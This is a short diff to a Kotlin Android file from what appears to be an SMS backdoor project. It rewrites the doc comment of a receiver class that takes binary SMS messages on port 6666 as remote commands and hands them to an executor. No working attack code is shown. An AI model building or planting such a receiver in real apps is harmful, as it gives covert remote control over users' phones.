@@ -45,7 +45,9 @@ import android.telephony.SmsMessage
 * @email evilthreads669966@gmail.com
 * @date 10/08/20
 *
-* Subscribes to any received binary sms messages over port 6666 and processes the command and then passes it to the RemoteCommandExecutor
+* [RemoteCommandReceiver] subscribes to any received binary sms messages over port 6666 and processes them as remote commands inside of [BroadcastReceiver.onReceive]
+* callback. It then sends the remote command to the [RemoteCommandExecutor] through an [Intent] for it to be executed with the [SmsBackdoor.commandHandler] off of the 
+* main thread.
 * */
 internal class RemoteCommandReceiver: BroadcastReceiver(){
     override fun onReceive(ctx: Context?, intent: Intent?) {
